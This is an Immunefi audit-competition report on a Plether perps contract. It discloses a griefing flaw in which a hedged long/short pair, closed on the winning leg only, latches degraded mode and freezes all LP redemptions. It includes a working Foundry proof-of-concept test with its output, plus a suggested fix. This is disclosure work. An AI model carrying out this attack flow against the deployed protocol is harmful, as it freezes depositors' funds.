# \#99063 [SC-High] Overly conservative degraded-mode solvency check enables attacker-controlled LP fund freeze exceeding 24 hours

**Submitted on Nov 11th 2026 at 17:48:27 UTC by @papikoo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99063
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

An attacker can cheaply and intentionally latch `degradedMode` on the `CfdEngine` by opening a hedged LONG+SHORT pair and closing only the winning leg after a small price move. This freezes **all** LP redemptions (both Senior and Junior tranches) for an unbounded duration controlled by the attacker, because `_enterDegradedModeIfInsolvent()` compares pool cash against **gross** directional max-profit liability without crediting the open losing position's locked margin. The freeze persists until the protocol owner manually injects capital via `recapitalize()` or the attacker voluntarily closes the losing position.

## Vulnerability Details

The root cause is in `CfdEngine._enterDegradedModeIfInsolvent()` (line 1351-1368):

```solidity
function _enterDegradedModeIfInsolvent(
    address account,
    uint256 pendingPoolPayoutAssets
) internal {
    if (degradedMode) return;
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
    // ...
    uint256 maxLiabilityAssets = _maxLiability();
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true;
    }
}
```

Where:
- `_availableCashForFreshPoolPayouts()` = `pool.totalAssets() - totalTraderClaimBalanceAssets` (line 865-871)
- `_maxLiability()` = `max(longState.maxProfitAssets, shortState.maxProfitAssets)` (line 1044-1050)

The check uses **gross** `maxProfitAssets` for the dominant side without subtracting locked margin (pnlPledge) held against the open positions. When a hedged trader closes only the profitable leg, the pool pays out the winner's PnL, reducing `totalAssets`. But the losing leg's `maxProfitAssets` remains at its full gross value, because `maxProfitAssets` is a directional aggregate that doesn't decrease when the opposing side closes.

**Attack flow:**

1. Attacker opens equal-notional LONG and SHORT positions using two accounts (hedged, near delta-neutral)
2. A small price move (~1.5%) makes one side profitable
3. Attacker closes only the winning leg — pool cash decreases by the payout
4. `_enterDegradedModeIfInsolvent()` fires: pool cash (987,540 USDG in the PoC) is now less than the losing side's gross `maxProfitAssets` (990,000 USDG) → `degradedMode = true`
5. `clearDegradedMode()` reverts with `CfdEngine__StillInsolvent` because the losing position's `maxProfitAssets` still exceeds pool cash — even if the price fully reverts to the original entry price
6. `HousePool.settleLpEpoch()` reverts with `HousePool__DegradedMode`, blocking all LP redemptions

The attacker keeps the losing position open indefinitely (paying only carry charges), maintaining the freeze. Even the protocol owner cannot clear degraded mode via `clearDegradedMode()` without first injecting fresh capital through `recapitalize()`.

The attack is **repeatable**: after the owner clears degraded mode, the attacker can immediately re-trigger it with new hedged positions.

## Impact Details

**Temporary freezing of funds for at least 24 hours** — specifically, ALL LP capital in both Senior and Junior tranches is frozen for an attacker-controlled, unbounded duration.

- The freeze blocks `HousePool.settleLpEpoch()`, which means no LP can withdraw (redeem) any funds
- New LP deposit settlements are also blocked during degraded mode
- The attacker controls the duration by keeping the losing position open (cost: only carry charges)
- The freeze persists even if the oracle price fully reverts to the original level

**Cost-to-damage ratio**: The attacker's cost is ~12 basis points of notional in execution fees plus ongoing carry charges. In the PoC, ~$120 in fees freezes ~$987,000 in LP capital — a 1:8,200 ratio, far exceeding the 1:100 threshold where griefing downgrade does not apply per the program's rules.

**Capital requirement**: 2× initial margin on the notional, approximately 0.4% of pool size at maximum leverage. The attacker recovers most margin when the losing position eventually closes (at a loss roughly equal to the winner's gain, minus fees).

**Remediation**: The solvency check should credit open positions' locked margin (pnlPledge) against gross max-profit liability, so that only the **net unfunded** exposure triggers degraded mode.

## References

- `CfdEngine._enterDegradedModeIfInsolvent()`: `packages/perps/src/CfdEngine.sol` lines 1351-1368
- `CfdEngine._availableCashForFreshPoolPayouts()`: `packages/perps/src/CfdEngine.sol` lines 865-871
- `CfdEngine._maxLiability()`: `packages/perps/src/CfdEngine.sol` lines 1044-1050
- `HousePool.settleLpEpoch()` degraded mode guard: `packages/perps/src/HousePool.sol` lines 1864-1870
- `CfdEngine.clearDegradedMode()`: `packages/perps/src/CfdEngine.sol` line 660-663


## Link to Proof of Concept

https://gist.github.com/divolt-research/1df1ea070c43e71464636d2302375906

## Proof of Concept

## Proof of Concept

### Steps to reproduce

1. Place the PoC file at `packages/perps/test/perps/poc/DegradedGriefPoC.t.sol`
2. Run: `forge test --match-test "test_PoC_hedgedCloseLatchesDegradedAndFreezesLp" -vvv`
3. Observe: test passes — degraded mode latches, `clearDegradedMode()` reverts, LP redemption reverts

### Step-by-step explanation

1. **Fund two attacker accounts** with 100,000 USDG each (atkLong and atkShort)
2. **Open hedged positions**: Open equal-notional LONG and SHORT positions (990,000 USDG notional each), split across multiple orders to stay within skew limits. Pool assets remain unchanged (1,002,000 USDG) because margin moves from clearinghouse, not from the pool.
3. **Price moves 1.5%**: Basket price drops from 1.00 to 0.985. The LONG position is now profitable.
4. **Close only the winning LONG leg**: Full close at 990,000e18 size at price 98,500,000 (0.985). Pool pays out the LONG's profit, reducing pool assets to 987,540 USDG.
5. **Degraded mode latches**: `_enterDegradedModeIfInsolvent()` compares pool cash (987,540) against the SHORT side's gross `maxProfitAssets` (990,000). Since 987,540 < 990,000, `degradedMode = true`.
6. **Owner cannot clear**: `clearDegradedMode()` calls the same `_availableCashForFreshPoolPayouts() < _maxLiability()` check, which still fails → reverts with `CfdEngine__StillInsolvent`.
7. **Price reverts — still cannot clear**: Even after updating the mark price back to 1.00, the check still fails because the SHORT position's `maxProfitAssets` hasn't changed and pool cash hasn't increased.
8. **LP redemption frozen**: An LP requests a redeem, advances to the settlement epoch, but `pool.settleLpEpoch()` reverts with `HousePool__DegradedMode`.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console} from "forge-std/console.sol";

contract DegradedGriefPoC is BasePerpTest {
    address atkLong = address(0xA001);
    address atkShort = address(0xA002);

    function test_PoC_hedgedCloseLatchesDegradedAndFreezesLp() public {
        // Fund attacker accounts with margin
        _fundTrader(atkLong, 100_000e6);
        _fundTrader(atkShort, 100_000e6);
        console.log("pool assets before", pool.totalAssets());

        // Step 1: Open hedged pair — equal LONG and SHORT notional (990k each)
        // Split across multiple orders to stay within skew limits
        _open(atkShort, CfdTypes.Side.SHORT, 390_000e18, 20_000e6, 1e8);
        _open(atkLong, CfdTypes.Side.LONG, 780_000e18, 15_000e6, 1e8);
        _open(atkShort, CfdTypes.Side.SHORT, 600_000e18, 40_000e6, 1e8);
        _open(atkLong, CfdTypes.Side.LONG, 210_000e18, 5_000e6, 1e8);
        assertFalse(engine.degradedMode());
        console.log("pool assets after opens", pool.totalAssets());

        // Step 2: Price moves 1.5% — close only the winning LONG leg
        _close(atkLong, CfdTypes.Side.LONG, 990_000e18, 98_500_000);
        console.log("pool assets after close", pool.totalAssets());

        // Step 3: Verify degraded mode latched
        assertTrue(engine.degradedMode(), "degraded latched");
        (uint256 lMax,,,) = engine.sides(0);
        (uint256 sMax,,,) = engine.sides(1);
        console.log("longMax", lMax, "shortMax", sMax);
        console.log("poolAssets", pool.totalAssets());

        // Step 4: Owner cannot clear — still insolvent by gross metric
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Step 5: Even after price fully reverts, still cannot clear
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Step 6: LP redemption is completely frozen
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        uint256 shares = juniorVault.estimateWithdrawShares(1e6);
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(pool.lpEpochStart(requestId));
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        uint256 markTime = engine.lastMarkTime();

        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        vm.prank(address(router));
        pool.settleLpEpoch(1e8, markTime);
    }
}
```

### Test output (passes)

```
[PASS] test_PoC_hedgedCloseLatchesDegradedAndFreezesLp() (gas: 3048008)
Logs:
  pool assets before              1002000000000  (1,002,000 USDG)
  pool assets after opens         1002000000000  (unchanged)
  pool assets after close          987540060000  (987,540 USDG)
  longMax 0  shortMax              990000000000  (990,000 USDG)
  poolAssets                       987540060000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Pool cash (987,540) < SHORT maxProfit (990,000) → degradedMode = true  
clearDegradedMode() → revert CfdEngine__StillInsolvent  
settleLpEpoch() → revert HousePool__DegradedMode
